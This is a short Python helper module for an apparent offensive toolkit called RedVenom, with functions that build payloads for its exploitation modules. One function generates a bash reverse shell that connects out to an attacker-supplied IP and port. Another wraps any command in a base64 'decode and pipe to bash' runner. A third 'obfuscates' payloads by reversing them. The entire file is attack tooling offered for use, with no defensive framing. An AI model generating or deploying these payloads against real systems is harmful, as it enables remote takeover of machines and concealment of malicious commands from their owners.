# utils/payload_helper.py

"""
payload_helper.py -Utility functions to assist with payload generation
Used by RedVenom exploitation modules.
"""
def generate_basic_payload(command):
    """Returns a simple bash payload that executes a given command."""
    return f'bash -c "{command}"'
    
def reverse_shell_payload(ip, port):
    """Generates a bash reverse shell payload."""
    return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    
def encode_payload(payload):
    """Encodes a payload in base64."""
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return f'echo {encoded} | base64 -d | bash'
    
def obfuscate_payload(payload):
    """Very basic obfuscation by reversing the string."""
    return payload[::-1]
    
